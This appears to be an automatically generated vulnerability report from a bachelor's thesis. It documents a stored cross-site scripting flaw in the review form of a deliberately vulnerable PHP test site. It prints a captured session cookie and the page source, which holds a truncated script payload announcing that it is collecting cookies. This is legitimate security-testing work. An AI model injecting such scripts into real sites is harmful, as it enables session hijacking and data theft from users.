Vulnerability Report
Part of the bachelor's thesis
Date and Time of Report Generation: 2024-11-12 18:08:07

Report Summary:
This report outlines the detection of vulnerabilities on various web pages and demonstrates potential exploitations.

Actions Taken:
1. Opened the login page and entered credentials.
2. Navigated to the 'Review Page' page and submitted potentially vulnerable data to test for XSS.
3. Verified if the data was stored correctly by accessing the database interface.
4. Captured cookies and any accessible sensitive data.

Page Name: Review Page
Vulnerability Found: XSS
Description: Cross-Site Scripting (XSS) vulnerability found in the form submission.
Potential Impact: Allows attackers to execute arbitrary scripts in the context of the user session.
Recommended Fix: Sanitize user input and use HTML encoding to prevent script injection.
Location: Review form on the review page

Result:
The potentially vulnerable data was successfully submitted and verified in the database.

Captured Data:
Cookies: PHPSESSID=gilcur45u2o6s8vka0sibr54ev
Session ID (PHPSESSID): gilcur45u2o6s8vka0sibr54ev
Username: not found
Password: not found

Captured Page Source after XSS Execution:
<html lang="en"><head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>review</title>
         <!-- Import CSS -->

   <!-- Swiper css link  -->
   <link rel="stylesheet" href="https://unpkg.com/swiper@7/swiper-bundle.min.css">

   <!-- Font awesome cdn link  -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.4.0/css/all.min.css">

   <!-- Custom main css file link  -->
   <link rel="stylesheet" href="https://zwa.toad.cz/~krossale/secure/public/css/style.css"> 

   <!-- Custom footer css file link  -->
   <link rel="stylesheet" href="https://zwa.toad.cz/~krossale/secure/public/css/style-footer.css">

   <!-- Media queries  -->
   <link rel="stylesheet" href="https://zwa.toad.cz/~krossale/secure/public/css/media.css">

   <!-- Custom js file link  -->
   <script src="https://zwa.toad.cz/~krossale/secure/public/js/script.js"></script>
   </head>

    <body>
        <!-- Header section starts -->

<section class="header">

         <!-- Logo for authorized users -->
      <a href="../models/home.php" class="logo">
         <img src="https://zwa.toad.cz/~krossale/secure/public/images/BoxingIcon.svg" alt="BoxingIcon">
      </a>
               
   <nav class="navbar">
      <a href="../models/home.php">Home</a>
      <a href="../models/about.php">About</a>
      <a href="../controllers/review.php"> Review</a>
      <a href="../controllers/booking.php">Booking</a>

      <!-- Unauthorized users see Login page , Register Page -->
      
      <!-- Authorized users see Log Out page -->
      <a href="../controllers/logout.php">Log out</a>

                     <a href="../models/admin_page.php">Personal account</a>
         
                  </nav>
  
   <div id="menu-btn" class="fas fa-bars"></div>
</section>

<!-- Header section ends -->
        <div class="main">
            <div><h1>Review</h1></div>
        </div>

        <section class="review">
        <!-- For non-users -->
        <!--  Unauthorized users see Login page , Register Page -->
        
        <!-- For USERS -->

            <!--  Authorized users see Log Out page -->

            <!-- Import review form from PHP file -->
            <div class="form-container">      
            <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php" id="commentForm">

                <!-- Import check Message -->
                <label for="message">Comment message</label>
                <p class="inform">Write your comment (English language), min.5, max.200 
                    characters</p>
                <textarea name="message" rows="10" cols="30" minlength="5" maxlength="202" placeholder="Write a comment* (Required)" id="message"></textarea><br>
                        
                <button type="submit" class="btn" name="post_comment">Post Comment</button>

            </form>
        </div> 
              
             

        </section>

        <h2 class="comments">Comments of users</h2>

                    <h4 class="date-name">2024-10-29 18:12:11 </h4>
            <p class="sender-name">user: </p>
            <p class="message-name">location:..models</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="2">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-10-29 18:14:09 </h4>
            <p class="sender-name">user: </p>
            <p class="message-name">Bla bla bla Bla bla bla</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="3">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-10-29 21:56:35 </h4>
            <p class="sender-name">user: </p>
            <p class="message-name">Everything is working!!!</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="4">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-10-29 23:45:47 </h4>
            <p class="sender-name">user: qwerty</p>
            <p class="message-name">just testinGGGgg</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="5">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-11-04 22:02:42 </h4>
            <p class="sender-name">user: qwerty</p>
            <p class="message-name">Just check a sendin message</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="6">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-11-04 22:18:43 </h4>
            <p class="sender-name">user: qwerty</p>
            <p class="message-name">xxxxxxxxxxxx</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="8">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-11-04 22:48:48 </h4>
            <p class="sender-name">user: Ivan</p>
            <p class="message-name">mmmmmmmmm</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="11">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-11-10 00:36:06 </h4>
            <p class="sender-name">user: ivan</p>
            <p class="message-name"></p><h1>Hello</h1><p></p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="15">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-11-11 13:58:37 </h4>
            <p class="sender-name">user: ivan</p>
            <p class="message-name"></p><h1>Hello</h1><p></p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="16">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-11-11 22:48:10 </h4>
            <p class="sender-name">user: ivan</p>
            <p class="message-name">1</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form method="POST" action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" value="46">

                        <button type="submit" name="delete_comment" id="delete_comment">Delete</button>
                    </form>
                
            </div>

                    <h4 class="date-name">2024-11-12 17:08:05 </h4>
            <p class="sender-name">user: ivan</p>
            <p class="message-name">
            <script>
                alert("XSS Attack! Collecting sensitive data...");
                var cookies = docume</p>

            <div class="delete-button">
                <!-- For Admins "Delete" -->
                                    <form 
                    method="POST" 
                    action="/~krossale/vulnerable/app/controllers/review.php">
                        <input type="hidden" name="comment_id" 
                        value="47">

                        <button type="submit" name="delete_comment" 
                        id="delete_comment">Delete</button>
                    </form>
                
            </div>

         

        <!-- Footer section starts -->

<section class="footer">

    <div class="box-container">

        <div class="box">
            <h3>Main Links</h3>
            <a href="../models/home.php"> <i class="fas fa-home"></i> Home</a>
            <a href="../models/about.php"> <i class="fas fa-info-circle"></i> About</a>
            <a href="../controllers/review.php"> <i class="fas fa-suitcase-rolling"></i> Review</a>
            <a href="../controllers/booking.php"> <i class="far fa-money-bill-alt"></i> Booking</a>
                
            <!-- 
            Unauthorized users see Login page , Register Page
            -->
            
            <!-- Authorized users see Add review page -->
                            <a href="../controllers/logout.php"><i class="fas fa-power-off"></i> Log out</a>

                
                    <a href="admin_page.php">
                        <i class="far fa-address-card"></i>	Personal account</a>

                                 
                    </div>

        <div class="box">
            <h3>Contact Info</h3>
            <a href="tel:+420776756746"> <i class="fas fa-phone">
            </i> Phone Number </a>
            <a href="mailto:krossale@fel.cvut.cz"> <i class="fas fa-envelope">
            </i> Email </a>
            <a href="https://www.github.com/mathewtroy/">
                <i class="fab fa-github"></i> Github </a>
            <a href="https://t.me/troy102102/"> 
                <i class="fab fa-telegram"></i> Telegram </a>
            <a href="https://www.linkedin.com/in/aleksandrkross/">
                <i class="fab fa-linkedin"></i> Linkedin </a>

        </div>

    </div>

    <div class="credit"> Created by 
        <span>Aleksandr K.</span> 
        <br>
        &copy; 2024. All rights reserved! 
    </div>

</section>

<!-- Footer section ends -->
    </body>
</html></script></p></body></html>
